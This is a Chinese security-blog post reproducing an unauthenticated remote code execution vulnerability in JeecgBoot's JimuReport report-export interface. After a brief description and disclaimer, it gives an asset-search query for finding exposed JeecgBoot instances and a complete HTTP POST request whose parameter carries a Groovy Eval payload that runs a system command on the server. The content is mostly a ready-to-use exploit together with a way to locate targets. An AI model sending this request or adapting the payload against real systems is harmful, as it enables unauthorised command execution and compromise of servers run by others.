#  【漏洞复现】JeecgBoot 积木报表远程代码执行漏洞  
 熔城Sec   2026-09-02 06:00  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/nKibbsr7q5Uoic4HqaOR77KgQOr062ubgGR7k9HhTqwJWan2KibZRiczhxkEzyKMBGO4LQDicBMFMPcJgp3RI6ia8IzA/640?&random=0.11349382888065818&wxfrom=5&wx_lazy=1&wx_fmt=other&tp=webp#imgIndex=1 "")  
  
免责声明  
  
 该公众号大部分文章来自作者日常学习笔记，也有部分文章是经过作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。公众号现在只对常读和星标的公众号才展示大图推送，建议把公众号设为星标，否则可能就看不到啦！感谢各位师傅。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/nKibbsr7q5Uoic4HqaOR77KgQOr062ubgGR7k9HhTqwJWan2KibZRiczhxkEzyKMBGO4LQDicBMFMPcJgp3RI6ia8IzA/640?&random=0.11349382888065818&wxfrom=5&wx_lazy=1&wx_fmt=other&tp=webp#imgIndex=1 "")  
  
漏洞描述  
  
JeecgBoot 内置 JimuReport(积木报表)组件的 auto/export 导出接口存在未授权远程代码执行漏洞,参数值以 = 开头时被内部表达式引擎按 Excel 公式解析,该引擎具备 Groovy 脚本能力且无过滤,可执行任意命令。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/nKibbsr7q5Uoic4HqaOR77KgQOr062ubgGR7k9HhTqwJWan2KibZRiczhxkEzyKMBGO4LQDicBMFMPcJgp3RI6ia8IzA/640?&random=0.11349382888065818&wxfrom=5&wx_lazy=1&wx_fmt=other&tp=webp#imgIndex=1 "")  
  
资产收集  
```
app="JeecgBoot-企业级低代码平台"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YTAMiax79d62txD1xoEiajJLsgvHXV0Of6zPlFKYS5I7eJM5MLpwFWiboxmDtUoLehpJKNx0eq1ELjNLptZpJJLtotXrcZaBxiaibspuzOc7YSfc/640?wx_fmt=png&from=appmsg "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/nKibbsr7q5Uoic4HqaOR77KgQOr062ubgGR7k9HhTqwJWan2KibZRiczhxkEzyKMBGO4LQDicBMFMPcJgp3RI6ia8IzA/640?&random=0.11349382888065818&wxfrom=5&wx_lazy=1&wx_fmt=other&tp=webp#imgIndex=1 "")  
  
漏洞复现  
```
POST /jeecg-boot/jmreport/auto/export HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Content-Type: application/json
Accept: application/json
{
  "reportParams": [
    {
      "id": "907480464532770816",
      "params": {
        "x": "=use groovy.util.Eval; Eval.me('throw new RuntimeException(\"id\".execute().text)')"
      },
      "exportType": "pdf"
    }
  ]
}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YTAMiax79d639oib5W1CQeCIHPnOuwp5iaTUFqB5Xb09eXHhruibd2EoAHulAyn0vWa0icXBAKaiaLIOkvgBV1rWicabptWXuKKGUXyhDdhNcG97XE/640?wx_fmt=png&from=appmsg "")  
  
